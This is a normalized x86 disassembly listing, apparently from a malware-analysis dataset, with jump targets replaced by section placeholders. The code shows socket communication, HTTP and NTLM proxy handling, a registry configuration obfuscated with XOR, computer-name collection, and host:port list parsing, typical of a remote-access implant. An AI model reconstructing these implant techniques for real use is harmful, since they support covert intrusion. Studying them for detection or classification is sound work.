push r--data
push eax
call esi
add esp 0xc
test eax eax
jne r-xdata
mov esi r--data
xor eax eax
inc eax
mov [ edi + 0x21c ] 0x100000
jmp r-xdata
cmp [ ebp - 0x410 ] 0xc8
jne r-xdata
mov ebx [ strlen@IAT ]
lea eax [ ebp - 0x40c ]
push eax
call ebx
pop ecx
cmp eax 0x2
jb r-xdata
mov ebx [ strlen@IAT ]
lea eax [ ebp - 0x40c ]
push eax
call ebx
pop ecx
cmp eax 0x2
jb r-xdata
lea eax [ ebp - 0x40c ]
push r--data
push eax
call ebx
pop ecx
lea ecx [ ebp - 0x40c ]
sub ecx 0x2
add eax ecx
push eax
call [ strcmp@IAT ]
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x40c ]
push r--data
push eax
call ebx
pop ecx
lea ecx [ ebp - 0x40c ]
sub ecx 0x2
add eax ecx
push eax
call [ strcmp@IAT ]
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x40c ]
push r--data
push eax
call [ strcmp@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
lea eax [ ebp - 0x40c ]
push r--data
push eax
call [ strcmp@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ edi + 0x90 ] 0x0
push 0x100000
je r-xdata
push esi
call ebx
pop ecx
push eax
lea eax [ ebp - 0x40c ]
push esi
push eax
call [ _strnicmp@IAT ]
add esp 0xc
test eax eax
jne r-xdata
push esi
call ebx
pop ecx
push eax
lea eax [ ebp - 0x40c ]
push esi
push eax
call [ _strnicmp@IAT ]
add esp 0xc
test eax eax
jne r-xdata
mov ebx [ edi + 0x22c ]
lea eax [ ebp - 0x40c ]
push eax
mov eax 0x3ff
call sub_1000646d
test eax eax
jle r-xdata
push esi
call ebx
pop ecx
lea eax [ ebp + eax - 0x40c ]
push eax
call [ atoi@IAT ]
pop ecx
test eax eax
je r-xdata
mov ebx [ edi + 0x22c ]
lea eax [ ebp - 0x40c ]
push eax
mov eax 0x3ff
call sub_1000646d
test eax eax
jle r-xdata
push esi
call ebx
pop ecx
lea eax [ ebp + eax - 0x40c ]
push eax
call [ atoi@IAT ]
pop ecx
cmp eax 0x100000
je r-xdata
jmp r-xdata
jmp r-xdata
sub_10008edb
push ebp
mov ebp esp
sub esp 0x41c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi ecx
cmp [ edi + 0x8 ] 0x1
mov [ ebp - 0x418 ] edi
jne r-xdata
cmp [ edi + 0x90 ] 0x0
push [ edi + 0x8c ]
je r-xdata
mov ebx [ edi + 0x228 ]
lea eax [ ebp - 0x408 ]
push eax
mov eax 0x3ff
call sub_1000646d
test eax eax
js r-xdata
lea eax [ edi + 0xc ]
push eax
mov [ ebp - 0x40c ] eax
call [ rand@IAT ]
push eax
lea eax [ ebp - 0x408 ]
push r--data
push eax
call [ sprintf@IAT ]
add esp 0x14
lea esi [ edi + 0xc ]
push esi
mov [ ebp - 0x40c ] esi
call [ rand@IAT ]
push eax
push [ edi + 0x8c ]
lea eax [ ebp - 0x408 ]
push esi
push r--data
push eax
call [ sprintf@IAT ]
add esp 0x1c
jmp r-xdata
or eax 0xffffffff
mov esi [ strlen@IAT ]
mov ebx r--data
push ebx
call esi
pop ecx
push eax
lea eax [ ebp - 0x408 ]
push ebx
push eax
call [ strncmp@IAT ]
add esp 0xc
test eax eax
jne r-xdata
mov esi [ edi + 0x228 ]
push 0x1388
call sub_10005dab
test eax eax
jle r-xdata
mov ebx [ strlen@IAT ]
lea eax [ ebp - 0x408 ]
push eax
call ebx
mov esi [ edi + 0x228 ]
pop ecx
push eax
lea eax [ ebp - 0x408 ]
push eax
call sub_100063f9
test eax eax
jle r-xdata
mov ebx [ edi + 0x228 ]
lea eax [ ebp - 0x408 ]
push eax
mov eax 0x400
call sub_1000646d
test eax eax
jle r-xdata
mov eax [ edi + 0x228 ]
mov eax [ eax + 0x10c ]
push 0x0
push 0x400
lea ecx [ ebp - 0x408 ]
push ecx
push eax
call [ recv@IAT ]
test eax eax
jle r-xdata
lea eax [ ebp - 0x408 ]
push eax
call esi
pop ecx
cmp eax 0x2
jb r-xdata
lea eax [ ebp - 0x408 ]
push eax
mov [ ebp - 0x9 ] 0x0
call ebx
pop ecx
cmp eax 0xf
jb r-xdata
lea eax [ ebp - 0x408 ]
push r--data
push eax
call esi
mov ebx [ strcmp@IAT ]
pop ecx
lea ecx [ ebp - 0x408 ]
sub ecx 0x2
add eax ecx
push eax
call ebx
pop ecx
pop ecx
test eax eax
jne r-xdata
mov esi [ strncmp@IAT ]
push 0x9
lea eax [ ebp - 0x408 ]
push r--data
push eax
call esi
add esp 0xc
test eax eax
je r-xdata
lea eax [ ebp - 0x408 ]
push r--data
push eax
call ebx
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x3ff ]
push eax
call [ atoi@IAT ]
xor ebx ebx
pop ecx
cmp eax ebx
je r-xdata
push 0x9
lea eax [ ebp - 0x408 ]
push r--data
push eax
call esi
add esp 0xc
test eax eax
jne r-xdata
mov ebx 0x100000
push ebx
lea eax [ ebp - 0x408 ]
push r--data
push eax
call [ sprintf@IAT ]
lea eax [ ebp - 0x408 ]
add esp 0xc
push eax
call esi
mov esi [ edi + 0x228 ]
pop ecx
push eax
lea eax [ ebp - 0x408 ]
push eax
call sub_100063f9
test eax eax
js r-xdata
cmp eax 0xc8
je r-xdata
mov [ edi + 0x220 ] ebx
jmp r-xdata
mov [ edi + 0x220 ] 0x100000
cmp [ edi + 0x90 ] ebx
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000eff2
leave
retn
cmp eax 0x197
jne r-xdata
and [ ebp - 0x410 ] ebx
mov esi r--data
lea eax [ ebp - 0x408 ]
push esi
push eax
call [ strstr@IAT ]
pop ecx
pop ecx
mov [ ebp - 0x414 ] eax
test eax eax
je r-xdata
push 0x5
push r--data
push esi
call [ strlen@IAT ]
add eax [ ebp - 0x414 ]
pop ecx
push eax
call [ _strnicmp@IAT ]
add esp 0xc
test eax eax
jne r-xdata
push 0x9
push r--data
push esi
call [ strlen@IAT ]
add eax [ ebp - 0x414 ]
pop ecx
push eax
call [ _strnicmp@IAT ]
add esp 0xc
test eax eax
jne r-xdata
xor ebx ebx
inc ebx
jmp r-xdata
mov eax [ ebp - 0x414 ]
inc eax
push esi
push eax
call [ strstr@IAT ]
pop ecx
pop ecx
mov [ ebp - 0x414 ] eax
test eax eax
jne r-xdata
mov [ ebp - 0x410 ] 0x1
test ebx ebx
jne r-xdata
mov eax [ edi + 0x228 ]
call sub_10005e95
lea eax [ edi + 0x94 ]
push eax
mov eax [ edi + 0x114 ]
mov edi [ edi + 0x228 ]
call sub_1000625e
test eax eax
js r-xdata
cmp [ ebp - 0x410 ] ebx
je r-xdata
mov esi [ ebp - 0x418 ]
push [ esi + 0x8c ]
push [ ebp - 0x40c ]
call [ rand@IAT ]
push eax
push [ esi + 0x8c ]
lea eax [ ebp - 0x408 ]
push [ ebp - 0x40c ]
push r--data
push eax
call [ sprintf@IAT ]
and [ ebp - 0x410 ] 0x0
add esp 0x1c
lea eax [ ebp - 0x40c ]
push eax
or edi 0xffffffff
neg ebx
sbb ebx ebx
lea eax [ ebp - 0x410 ]
push eax
lea eax [ esi + 0x198 ]
and ebx 0xb1edf506
push eax
add ebx 0x4e544c4d
push ebx
push [ esi + 0x228 ]
lea edx [ esi + 0x118 ]
lea ecx [ ebp - 0x408 ]
mov [ ebp - 0x40c ] edi
call sub_1000856e
test eax eax
jns r-xdata
cmp [ ebp - 0x410 ] 0xc8
jne r-xdata
mov eax edi
jmp r-xdata
cmp [ ebp - 0x40c ] 0x100000
jne r-xdata
mov [ esi + 0x218 ] ebx
mov edi esi
sub_10009306
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x24
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x20 ] eax
push ebx
push esi
push edi
mov edi ecx
mov eax [ edi + 0x4 ]
mov ecx [ ebp + 0xc ]
mov [ esp + 0x10 ] ecx
cmp eax 0x60
je r-xdata
mov eax [ ebp + 0x10 ]
xor esi esi
add eax 0x30
cmp [ edi + 0x8 ] esi
je r-xdata
cmp eax 0x70
je r-xdata
cmp [ edi + 0x21c ] eax
jae r-xdata
cmp [ edi + 0x220 ] eax
jae r-xdata
push [ ebp + 0x10 ]
mov edi [ edi + 0x228 ]
mov eax [ edi ]
push ecx
push [ ebp + 0x8 ]
mov ecx edi
call [ eax + 0x20 ]
test eax eax
jle r-xdata
push [ ebp + 0x10 ]
mov ecx [ edi + 0x22c ]
push [ esp + 0x14 ]
mov eax [ ecx ]
push [ ebp + 0x8 ]
call [ eax + 0x20 ]
cmp eax esi
jle r-xdata
push 0x18
lea eax [ esp + 0x18 ]
push esi
push eax
call [ memset@IAT ]
mov eax [ edi + 0x21c ]
add esp 0xc
mov [ esp + 0x14 ] eax
push 0x18
lea eax [ esp + 0x18 ]
mov [ esp + 0x1c ] esi
mov [ esp + 0x28 ] esi
mov [ esp + 0x24 ] esi
mov esi [ edi + 0x22c ]
push eax
call sub_100063f9
mov eax [ edi + 0x21c ]
mov esi [ edi + 0x22c ]
sub eax 0x18
push eax
call sub_100063b8
push 0x1
call sub_10008b42
test eax eax
js r-xdata
push [ ebp + 0x10 ]
mov ecx [ edi + 0x228 ]
push [ esp + 0x14 ]
mov eax [ ecx ]
push [ ebp + 0x8 ]
call [ eax + 0x20 ]
cmp eax esi
jle r-xdata
push 0x18
lea eax [ esp + 0x18 ]
push esi
push eax
call [ memset@IAT ]
mov eax [ edi + 0x220 ]
add esp 0xc
mov [ esp + 0x14 ] eax
push 0x18
lea eax [ esp + 0x18 ]
mov [ esp + 0x1c ] esi
mov [ esp + 0x28 ] esi
mov [ esp + 0x24 ] esi
mov esi [ edi + 0x228 ]
push eax
call sub_100063f9
mov eax [ edi + 0x220 ]
mov esi [ edi + 0x228 ]
sub eax 0x18
push eax
call sub_100063b8
mov ecx edi
call sub_10008edb
test eax eax
jns r-xdata
mov ecx [ esp + 0x2c ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_1000eff2
mov esp ebp
pop ebp
retn 0xc
jmp r-xdata
sub [ edi + 0x21c ] eax
or eax 0xffffffff
jmp r-xdata
xor esi esi
sub [ edi + 0x220 ] eax
jmp r-xdata
xor esi esi
xor eax eax
inc eax
sub_10009495
push ebp
mov ebp esp
push edi
mov edi ecx
mov eax [ edi + 0x4 ]
cmp eax 0x60
je r-xdata
cmp [ edi + 0x8 ] 0x0
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
je r-xdata
cmp eax 0x70
je r-xdata
mov ecx [ edi + 0x228 ]
mov eax [ ecx ]
call [ eax + 0x24 ]
mov esi eax
test esi esi
jle r-xdata
mov ecx [ edi + 0x22c ]
mov eax [ ecx ]
call [ eax + 0x24 ]
mov esi eax
test esi esi
jle r-xdata
mov ecx [ edi + 0x228 ]
mov eax [ ecx ]
pop edi
pop ebp
jmp [ eax + 0x24 ]
mov eax esi
sub [ edi + 0x220 ] esi
jne r-xdata
sub [ edi + 0x21c ] esi
jne r-xdata
mov ecx edi
call sub_10008edb
push 0x1
call sub_10008b42
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
test eax eax
jns r-xdata
pop esi
pop edi
pop ebp
retn 0xc
sub_10009527
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ecx + 0x228 ]
lea ecx [ ebp - 0x18 ]
push ecx
lea ecx [ ebp - 0x14 ]
push ecx
push [ eax + 0x10c ]
mov [ ebp - 0x18 ] 0x10
call [ getsockname@IAT ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x10 ]
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1000eff2
leave
retn
sub_1000957b
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ecx + 0x228 ]
lea ecx [ ebp - 0x18 ]
push ecx
lea ecx [ ebp - 0x14 ]
push ecx
push [ eax + 0x10c ]
mov [ ebp - 0x18 ] 0x10
call [ getsockname@IAT ]
test eax eax
jns r-xdata
push [ ebp - 0x12 ]
call [ ntohs@IAT ]
movzx eax ax
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
movzx eax ax
call sub_1000eff2
leave
retn
sub_100095cf
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ecx + 0x228 ]
lea ecx [ ebp - 0x18 ]
push ecx
lea ecx [ ebp - 0x14 ]
push ecx
push [ eax + 0x10c ]
mov [ ebp - 0x18 ] 0x10
call [ getpeername@IAT ]
test eax eax
jns r-xdata
push [ ebp - 0x12 ]
call [ ntohs@IAT ]
movzx eax ax
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
movzx eax ax
call sub_1000eff2
leave
retn
sub_10009673
push ebp
mov ebp esp
mov eax [ ecx + 0x4 ]
push esi
cmp eax 0x60
je r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
cmp eax 0x70
jne r-xdata
mov esi [ ecx + 0x228 ]
mov esi [ ecx + 0x22c ]
jmp r-xdata
push [ ebp + 0x8 ]
call sub_10005dab
pop esi
pop ebp
retn 0x4
sub_100096a5
push ebp
mov ebp esp
mov eax [ ecx + 0x4 ]
push esi
cmp eax 0x60
je r-xdata
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
cmp eax 0x70
je r-xdata
mov esi [ ecx + 0x228 ]
jmp r-xdata
mov esi [ ecx + 0x22c ]
push [ ebp + 0x8 ]
call sub_10005e20
pop esi
pop ebp
retn 0x4
sub_100096fc
push ebp
mov ebp esp
sub esp 0x410
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
lea eax [ ebp - 0x408 ]
push eax
push 0x1
xor ebx ebx
push ebx
push r--data
push 0x80000002
call [ RegOpenKeyExW@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov al bl
xor ecx ebp
pop ebx
call sub_1000eff2
leave
retn
lea eax [ ebp - 0x40c ]
push eax
lea eax [ ebp - 0x404 ]
push eax
lea eax [ ebp - 0x410 ]
push eax
push ebx
push r--data
push [ ebp - 0x408 ]
mov [ ebp - 0x40c ] 0x3ff
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x408 ]
call [ RegCloseKey@IAT ]
cmp [ ebp - 0x410 ] 0x3
jne r-xdata
mov eax 0x190
cmp [ ebp - 0x40c ] eax
jne r-xdata
push esi
xor esi esi
lea ecx [ ebp + esi - 0x404 ]
mov dl [ ecx ]
xor dl 0x5f
inc esi
not dl
mov [ ecx ] dl
cmp esi eax
jl r-xdata
push eax
lea eax [ ebp - 0x404 ]
push eax
push edi
call [ memcpy@IAT ]
add esp 0xc
mov bl 0x1
pop esi
sub_100097c7
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x1a4
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1a0 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ memcpy@IAT ]
push edi
mov edi 0x190
push edi
mov [ esp + 0x18 ] eax
lea eax [ esp + 0x1c ]
push rw-data
push eax
mov [ esp + 0x1b ] 0x0
call esi
movsx eax [ esp + 0x64 ]
mov ebx [ isalnum@IAT ]
push eax
call ebx
add esp 0x10
test eax eax
je r-xdata
cmp [ esp + 0x58 ] 0x0
je r-xdata
movsx eax [ esp + 0x59 ]
push eax
call ebx
pop ecx
test eax eax
je r-xdata
mov ecx [ esp + 0x1ac ]
mov al [ esp + 0xf ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_1000eff2
mov esp ebp
pop ebp
retn
xor eax eax
mov [ esp + 0x10 ] eax
cmp [ esp + 0x160 ] 0x7e900
jb r-xdata
mov ecx [ esp + 0x10 ]
add [ esp + 0x10 ] 0x8
mov edx 0xd1fc2df6
shr edx cl
xor [ esp + eax + 0x18 ] dl
inc eax
cmp [ esp + 0x10 ] 0xc80
jb r-xdata
movsx eax [ esp + 0x58 ]
push eax
call ebx
pop ecx
test eax eax
je r-xdata
push edi
lea eax [ esp + 0x1c ]
push eax
push [ esp + 0x1c ]
call esi
mov [ esp + 0x1b ] 0x1
add esp 0xc
movsx eax [ esp + 0x59 ]
push eax
call ebx
pop ecx
test eax eax
je r-xdata
sub_100098aa
push ebp
mov ebp esp
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
mov edi ecx
call sub_100096fc
test al al
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_1000eff2
leave
retn
push ebx
push edi
call sub_100097c7
mov bl al
pop ecx
test bl bl
je r-xdata
mov al bl
pop ebx
cmp [ edi ] 0x0
jne r-xdata
push esi
call [ rand@IAT ]
cdq
mov ecx 0x270f
idiv ecx
mov esi [ strlen@IAT ]
push edx
push r--data
push edi
call esi
pop ecx
push 0x40
pop ecx
sub ecx eax
push ecx
push edi
call esi
pop ecx
add eax edi
push eax
call [ _snprintf@IAT ]
add esp 0x10
pop esi
lea eax [ ebp - 0x88 ]
push eax
lea eax [ ebp - 0x84 ]
push eax
mov [ ebp - 0x88 ] 0x80
call [ GetComputerNameA@IAT ]
call [ rand@IAT ]
cdq
mov ecx 0x270f
idiv ecx
lea eax [ ebp - 0x84 ]
push edx
push eax
push r--data
push 0x40
push edi
call [ _snprintf@IAT ]
add esp 0x14
jmp r-xdata
mov [ edi + 0x3f ] 0x0
call sub_1000997a
sub_1000997a
push ebp
mov ebp esp
sub esp 0x408
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x408 ]
push eax
push 0x2
push 0x0
push r--data
push 0x80000002
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
push esi
mov esi 0x190
push esi
lea eax [ ebp - 0x404 ]
push edi
push eax
call [ memcpy@IAT ]
add esp 0xc
xor ecx ecx
xor al al
jmp r-xdata
lea eax [ ebp + ecx - 0x404 ]
mov dl [ eax ]
xor dl 0x5f
inc ecx
not dl
mov [ eax ] dl
cmp ecx esi
jb r-xdata
push esi
lea eax [ ebp - 0x404 ]
push eax
push 0x3
push 0x0
push r--data
push [ ebp - 0x408 ]
call [ RegSetValueExA@IAT ]
push [ ebp - 0x408 ]
mov esi eax
call [ RegCloseKey@IAT ]
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1000eff2
leave
retn
mov al 0x1
push esi
call [ SetLastError@IAT ]
xor al al
jmp r-xdata
pop esi
sub_10009a28
push esi
mov esi ecx
mov [ esi ] r--data
jmp r-xdata
cmp [ esi + 0x18 ] 0x0
jne r-xdata
mov eax [ esi + 0x18 ]
mov ecx [ eax + 0x8 ]
push eax
mov [ esi + 0x18 ] ecx
call [ free@IAT ]
pop ecx
lea eax [ esi + 0x1c ]
push eax
call [ DeleteCriticalSection@IAT ]
mov [ esi ] r--data
pop esi
retn
sub_10009a6c
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push edi
lea ebx [ esi + 0x1c ]
push ebx
xor edi edi
call [ EnterCriticalSection@IAT ]
mov eax [ esi + 0x18 ]
test eax eax
je r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
test edi edi
je r-xdata
mov edi eax
mov eax [ edi + 0x8 ]
mov [ esi + 0x18 ] eax
xor eax eax
mov eax [ edi + 0x4 ]
dec eax
dec eax
je r-xdata
mov ecx edi
call sub_1000b2b0
dec eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx ] 0x40
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov eax [ eax ]
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov ecx edi
call sub_1000af7f
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
test eax eax
je r-xdata
sub_10009adb
push ebp
mov ebp esp
push esi
push edi
push [ ebp + 0x10 ]
mov esi ecx
call [ malloc@IAT ]
mov edi eax
pop ecx
test edi edi
je r-xdata
xor eax eax
pop edi
inc eax
pop esi
pop ebp
retn 0xc
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call [ memcpy@IAT ]
add esp 0xc
lea ebx [ esi + 0x1c ]
push ebx
call [ EnterCriticalSection@IAT ]
mov eax [ esi + 0x18 ]
test eax eax
jne r-xdata
mov ecx [ eax + 0x8 ]
test ecx ecx
jne r-xdata
and [ edi + 0x8 ] eax
mov [ esi + 0x18 ] edi
mov eax ecx
and [ edi + 0x8 ] ecx
mov [ eax + 0x8 ] edi
jmp r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
pop ebx
sub_10009b3c
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10009a28
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10004ae2
pop ecx
sub_10009b5b
push ebp
mov ebp esp
sub esp 0x458
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ strncpy@IAT ]
push 0x400
push eax
lea eax [ ebp - 0x444 ]
push eax
call ebx
add esp 0xc
cmp [ ebp - 0x444 ] 0x0
jne r-xdata
push esi
mov esi [ strchr@IAT ]
mov [ ebp - 0x448 ] 0x1
lea eax [ ebp - 0x443 ]
jmp r-xdata
xor eax eax
jmp r-xdata
push 0x2c
push eax
call esi
pop ecx
pop ecx
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_1000eff2
leave
retn 0x4
inc [ ebp - 0x448 ]
inc eax
mov eax [ ebp - 0x448 ]
xor ecx ecx
push 0x24
inc eax
pop edx
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call [ operator delete[]@IAT ]
pop ecx
mov [ ebp - 0x454 ] eax
test eax eax
je r-xdata
pop esi
mov ecx [ ebp - 0x448 ]
inc ecx
imul ecx ecx 0x24
push edi
push ecx
push 0x0
push eax
call [ memset@IAT ]
and [ ebp - 0x450 ] 0x0
add esp 0xc
cmp [ ebp - 0x448 ] 0x0
lea edi [ ebp - 0x444 ]
jle r-xdata
mov eax [ ebp - 0x454 ]
pop edi
mov eax [ ebp - 0x454 ]
mov [ ebp - 0x44c ] eax
push 0x40
lea eax [ ebp - 0x44 ]
push edi
push eax
call ebx
lea eax [ ebp - 0x44 ]
push 0x3a
push eax
mov [ ebp - 0x5 ] 0x0
call esi
add esp 0x14
test eax eax
je r-xdata
mov [ eax ] 0x0
mov eax [ ebp - 0x458 ]
lea edi [ eax + 0x1 ]
test eax eax
je r-xdata
push 0x3a
push edi
call esi
pop ecx
pop ecx
mov ecx eax
push 0x20
sub ecx edi
pop eax
cmp ecx eax
ja r-xdata
inc [ ebp - 0x450 ]
mov eax [ ebp - 0x450 ]
add [ ebp - 0x44c ] 0x24
cmp eax [ ebp - 0x448 ]
jl r-xdata
push eax
push edi
push [ ebp - 0x44c ]
call ebx
push 0x3a
push edi
call esi
inc eax
push eax
call [ atoi@IAT ]
mov ecx [ ebp - 0x44c ]
add esp 0x18
mov [ ecx + 0x20 ] eax
push 0x3a
push edi
call esi
pop ecx
pop ecx
sub eax edi
push 0x2c
push edi
call esi
pop ecx
pop ecx
mov [ ebp - 0x458 ] eax
test eax eax
je r-xdata
sub_10009cdf
push ebp
mov ebp esp
push esi
push 0x438
call sub_10004aa8
mov esi eax
pop ecx
test esi esi
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0xc
cmp [ ebp + 0x10 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ esi ] 0x438
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x10 ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0xc ] eax
je r-xdata
push 0x21c
lea eax [ esi + 0x21c ]
push ebx
push eax
call [ memcpy@IAT ]
add esp 0xc
push 0x104
push [ ebp + 0x10 ]
lea eax [ esi + 0x14 ]
push eax
call [ wcsncpy@IAT ]
add esp 0xc
xor eax eax
mov [ esi + 0x21a ] ax
sub_10009d54
push ebp
mov ebp esp
sub esp 0x298
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
push 0x27c
lea eax [ ebp - 0x280 ]
push 0x0
push eax
call [ memset@IAT ]
fld1
add esp 0xc
fstp [ ebp - 0x27c ]
lea eax [ ebp - 0x28c ]
push eax
lea eax [ ebp - 0x238 ]
push eax
mov [ ebp - 0x28c ] 0x3f
call [ GetComputerNameA@IAT ]
mov edi [ strncpy@IAT ]
push 0x40
mov ebx rw-data
lea eax [ ebp - 0x278 ]
push ebx
push eax
call edi
mov eax [ esi + 0x4 ]
push 0x190
mov [ ebp - 0x198 ] eax
lea eax [ ebp - 0x194 ]
push ebx
push eax
mov [ ebp - 0x239 ] 0x0
call [ memcpy@IAT ]
add esp 0x18
lea ebx [ ebp - 0x1d8 ]
call sub_1000cc81
mov eax [ esi ]
mov ecx esi
call [ eax + 0x4 ]
push 0x10
push eax
call [ inet_ntoa@IAT ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
call edi
mov eax [ esi ]
add esp 0xc
push 0x27c
lea ecx [ ebp - 0x280 ]
push ecx
push 0x10
mov ecx esi
mov [ ebp - 0x1e9 ] 0x0
call [ eax + 0x34 ]
pop edi
pop ebx
test eax eax
jle r-xdata
or eax 0xffffffff
mov eax [ esi ]
push 0x2710
mov ecx esi
call [ eax + 0x1c ]
test eax eax
jle r-xdata
mov eax [ esi ]
lea ecx [ ebp - 0x290 ]
push ecx
lea ecx [ ebp - 0x284 ]
push ecx
lea ecx [ ebp - 0x288 ]
push ecx
mov ecx esi
call [ eax + 0x38 ]
test eax eax
jle r-xdata
cmp [ ebp - 0x288 ] 0x20
jne r-xdata
push [ ebp - 0x284 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x3c ]
cmp [ ebp - 0x290 ] 0x8
jb r-xdata
push 0x8
push [ ebp - 0x284 ]
lea eax [ ebp - 0x298 ]
push eax
call [ memcpy@IAT ]
mov eax [ esi ]
add esp 0xc
push [ ebp - 0x284 ]
mov ecx esi
call [ eax + 0x3c ]
xor eax eax
cmp [ ebp - 0x298 ] eax
setne al
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1000eff2
leave
retn
sub_10009ec1
push ebp
mov ebp esp
sub esp 0x84
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov ebx ecx
push edi
mov [ ebp - 0x84 ] ebx
call [ GetTickCount@IAT ]
push eax
call [ srand@IAT ]
mov [ esp ] 0xc350
call [ Sleep@IAT ]
and [ ebp - 0x70 ] 0x0
and [ ebp - 0x64 ] 0x0
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
and [ ebp - 0x60 ] 0x0
mov ecx rw-data
call sub_100098aa
mov eax [ rw-data ]
imul eax eax 0xea60
mov [ ebx + 0x10 ] eax
mov eax [ rw-data ]
push 0x40
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x44 ]
push 0x0
push eax
call [ memset@IAT ]
mov edi [ strchr@IAT ]
push 0x3a
mov esi rw-data
push esi
call edi
add esp 0x14
test eax eax
je r-xdata
push [ ebx + 0x38 ]
call [ CloseHandle@IAT ]
push 0x0
call [ ExitThread@IAT ]
push 0x40
lea eax [ ebp - 0x44 ]
push esi
push eax
call [ strncpy@IAT ]
add esp 0xc
and [ ebp - 0x58 ] 0x0
mov [ ebp - 0x5 ] 0x0
push 0x3a
push esi
call edi
sub eax esi
push eax
lea eax [ ebp - 0x44 ]
push esi
push eax
call [ strncpy@IAT ]
push 0x3a
push esi
mov [ ebp - 0x5 ] 0x0
call edi
inc eax
push eax
call [ atoi@IAT ]
add esp 0x20
mov [ ebp - 0x58 ] eax
jmp r-xdata
cmp [ rw-data ] edi
jne r-xdata
push 0x7
push r--data
mov esi rw-data
push esi
call [ _strnicmp@IAT ]
add esp 0xc
test eax eax
jne r-xdata
xor edi edi
cmp [ ebp - 0x64 ] edi
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
call [ GetLocalTime@IAT ]
mov eax [ rw-data ]
mov ecx [ rw-data ]
movzx edx [ ebp - 0x4c ]
cmp eax ecx
jae r-xdata
cmp [ rw-data ] edi
je r-xdata
push esi
call sub_10009b5b
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x64 ] edi
jmp r-xdata
cmp eax edx
ja r-xdata
cmp eax edx
ja r-xdata
mov edi [ ebp - 0x70 ]
imul edi edi 0x24
add edi [ ebp - 0x64 ]
cmp [ edi ] 0x0
je r-xdata
cmp [ ebp - 0x59 ] 0x0
je r-xdata
mov [ ebp - 0x70 ] edi
cmp [ ebp - 0x64 ] edi
je r-xdata
cmp edx ecx
jbe r-xdata
push [ ebp - 0x64 ]
call [ `placement delete closure'@IAT ]
and [ ebp - 0x64 ] 0x0
pop ecx
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor esi esi
jmp r-xdata
push 0x3a98
jmp r-xdata
jmp r-xdata
mov esi edi
call sub_10004cc5
mov esi r--data
mov [ ebp - 0x7c ] eax
